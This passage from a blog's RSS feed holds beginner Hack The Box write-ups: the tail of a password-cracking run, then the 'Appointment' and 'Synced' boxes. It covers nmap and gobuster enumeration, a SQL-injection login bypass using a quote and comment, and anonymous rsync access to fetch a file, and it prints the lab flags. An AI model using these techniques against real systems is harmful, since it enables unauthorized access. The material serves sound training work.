</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-13 16:30<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 430400p/s 430400c/s 430400C/s mango..Nicole
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Session completed.</span></span></code></pre></div>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Appointment</title>
      <link>http://localhost:1313/htb-appointment/</link>
      <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-appointment/</guid>
      <description>I just finished Tier 0 of the Starting Point and now I&amp;rsquo;m moving on to Tier 1 boxes. These are still very easy level boxes, but we all start somewhere, and I&amp;rsquo;m enjoying every step of this process. That&amp;rsquo;s what matters hehe.
What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? SQL Injection What is the 2021 OWASP Top 10 classification for this vulnerability?</description>
      <content:encoded><![CDATA[<p>I just finished Tier 0 of the Starting Point and now I&rsquo;m moving on to Tier 1 boxes. These are still <code>very easy</code> level boxes, but we all start somewhere, and I&rsquo;m enjoying every step of this process. That&rsquo;s what matters hehe.</p>
<p><img src="image.png#center" alt="alt text"></p>
<hr>
<h4 id="what-does-the-acronym-sql-stand-for">What does the acronym SQL stand for?</h4>






<pre tabindex="0"><code>Structured Query Language</code></pre>
<br>
<h4 id="what-is-one-of-the-most-common-type-of-sql-vulnerabilities">What is one of the most common type of SQL vulnerabilities?</h4>






<pre tabindex="0"><code>SQL Injection</code></pre>
<br>
<h4 id="what-is-the-2021-owasp-top-10-classification-for-this-vulnerability">What is the 2021 OWASP Top 10 classification for this vulnerability?</h4>






<pre tabindex="0"><code>A03:2021-Injection</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-does-nmap-report-as-the-service-and-version-that-are-running-on-port-80-of-the-target">What does Nmap report as the service and version that are running on port 80 of the target?</h4>






<pre tabindex="0"><code>Apache httpd 2.4.38 ((Debian))</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.50.1 -p <span style="color:#fab387">80</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 13:16 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.50.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0085s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>80/tcp open  http    Apache httpd 2.4.38 <span style="color:#89dceb;font-weight:bold">((</span>Debian<span style="color:#89dceb;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|_http-server-header: Apache/2.4.38 <span style="color:#89dceb;font-weight:bold">(</span>Debian<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|_http-title: Login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 6.76 seconds</span></span></code></pre></div>
<br>
<h4 id="what-is-the-standard-port-used-for-the-https-protocol">What is the standard port used for the HTTPS protocol?</h4>






<pre tabindex="0"><code>443</code></pre>
<br>
<h4 id="what-is-a-folder-called-in-web-application-terminology">What is a folder called in web-application terminology?</h4>






<pre tabindex="0"><code>directory</code></pre>
<br>
<h4 id="what-is-the-http-response-code-is-given-for-not-found-errors">What is the HTTP response code is given for &lsquo;Not Found&rsquo; errors?</h4>






<pre tabindex="0"><code>404</code></pre>
<br>
<h4 id="gobuster-is-one-tool-used-to-brute-force-directories-on-a-webserver-what-switch-do-we-use-with-gobuster-to-specify-were-looking-to-discover-directories-and-not-subdomains">Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we&rsquo;re looking to discover directories, and not subdomains?</h4>






<pre tabindex="0"><code>dir</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-singlce-character-can-be-used-to-comment-out-the-rest-of-a-line-in-mysql">What singlce character can be used to comment out the rest of a line in MySQL?</h4>






<pre tabindex="0"><code>#</code></pre>
<p>We can also use <code>--</code> for commenting, but that&rsquo;s two characters.</p>
<br>
<h4 id="if-user-input-is-not-handled-carefully-it-could-be-interpreted-as-a-comment-use-a-comment-to-login-as-admin-without-knowing-the-password-what-is-the-first-word-on-the-webpage-returned">If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</h4>






<pre tabindex="0"><code>Congratulations</code></pre>
<p>I first tried <code>admin#</code> but kept failing to log in, so since the <code>gobuster</code> was mentioned earlier, I tried dirbuster to see if there were any helpful folders open but couldn&rsquo;t find any.</p>
<p>After peeping the provided walkthrough, I learned that I had to include <code>'</code> the single quote to close the query, allowing the script to search for the <code>admin</code> username and then add the hashtag symbol to comment out the rest of the query.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ gobuster dir -u http://10.129.50.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://10.129.50.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/images               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 311<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/images/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/css                  <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 308<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/css/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/js                   <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 307<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/js/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/vendor               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 311<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/vendor/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/fonts                <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 310<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://10.129.50.1/fonts/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/server-status        <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 276<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Progress: <span style="color:#fab387">220560</span> / <span style="color:#fab387">220561</span> <span style="color:#89dceb;font-weight:bold">(</span>100.00%<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span><span style="color:#f5e0dc">Finished</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span></span></span></code></pre></div>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>e3d0796d002a446c0e622226f42e9672</code></pre>
<br>
<p><img src="image-5.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Synced</title>
      <link>http://localhost:1313/htb-synced/</link>
      <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-synced/</guid>
      <description>What is the default port for rsync? 873 How many TCP ports are open on the remote host? 1 As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it&amp;rsquo;s rsync.
1[us-starting-point-vip-1-dhcp][10.10.14.28][leewookb@htb-wv2b0ymwtt][~] 2 []$ nmap -sC -sV 10.129.49.240 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 12:14 CDT 4Nmap scan report for 10.129.49.240 5Host is up (0.</description>
      <content:encoded><![CDATA[<h4 id="what-is-the-default-port-for-rsync">What is the default port for rsync?</h4>






<pre tabindex="0"><code>873</code></pre>
<br>
<h4 id="how-many-tcp-ports-are-open-on-the-remote-host">How many TCP ports are open on the remote host?</h4>






<pre tabindex="0"><code>1</code></pre>
<p>As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it&rsquo;s <code>rsync</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.49.240 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 12:14 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.49.240
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0092s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>873/tcp open rsync <span style="color:#89dceb;font-weight:bold">(</span>protocol version 31<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 16.33 seconds</span></span></code></pre></div>
<br>
<h4 id="what-is-the-protocol-version-used-by-rsync-on-the-remote-machine">What is the protocol version used by rsync on the remote machine?</h4>






<pre tabindex="0"><code>31</code></pre>
<br>
<h4 id="what-is-the-most-common-command-name-on-linux-to-interact-with-rsync">What is the most common command name on Linux to interact with rsync?</h4>






<pre tabindex="0"><code>rsync</code></pre>
<p><strong>rsync</strong> is an open source utility that provides fast incremental file transfer. The way rsync works makes it an excellent choice when there is a need to synchronize files between a computer and a storage drive and across networked computers.</p>
<br>
<h4 id="what-credentials-do-you-have-to-pass-to-rsync-in-order-to-use-anonymous-authentication-anonymousanonymous-anonymous-none-rsyncrsync">What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync</h4>






<pre tabindex="0"><code>None</code></pre>
<br>
<h4 id="what-is-the-option-to-only-list-shares-and-files-on-rsync-no-need-to-include-the-leading---characters">What is the option to only list shares and files on rsync? (No need to include the leading &ndash;characters)</h4>






<pre tabindex="0"><code>list-only</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>72eaf5344ebb84908ae543a719830519</code></pre>
<p>The generic syntax used by <code>rsync</code> is the following:</p>






<pre tabindex="0"><code>rsync [OPTION] ... [USER@]HOST::SRC [DEST]</code></pre>
<p>where SRC is the file or directory to copy from, DEST is the file or directory to copy to, and square brackets indicate optional parameters.</p>
<p>The <code>[USER@]</code> optional parameter is used when we want to access the remote machine in an authetnicated way. In this case, we don&rsquo;t have any valid credentials so we will omit this portion and try an anonymous authentication.</p>
<p><code>rsync --list-only 10.129.49.240::</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ rsync --list-only 10.129.49.240::
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>public         	Anonymous Share</span></span></code></pre></div>
<br>
<p>Notice there is a public directory with the description, Anonymous Share.
Let&rsquo;s navigate to public directory</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ rsync --list-only 10.129.49.240::public
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>drwxr-xr-x          4,096 2022/10/24 17:02:23 .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>-rw-r--r--             <span style="color:#fab387">33</span> 2022/10/24 16:32:03 flag.txt</span></span></code></pre></div>
<br>
<p>okay we see there&rsquo;s the <code>flag.txt</code> file. Now let&rsquo;s copy this file to our local machine.
When downloading the file to our local machine, make sure to remove the <strong><em>&ndash;list-only</em></strong> option and specify the destination.</p>
<p><code>rsync [OPTION] ... [USER@]HOST::SRC [DEST]</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ rsync 10.129.49.240::public/flag.txt flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>flag.txt  htb_vpn_logs.log  my_credentials.txt  my_data  README.license
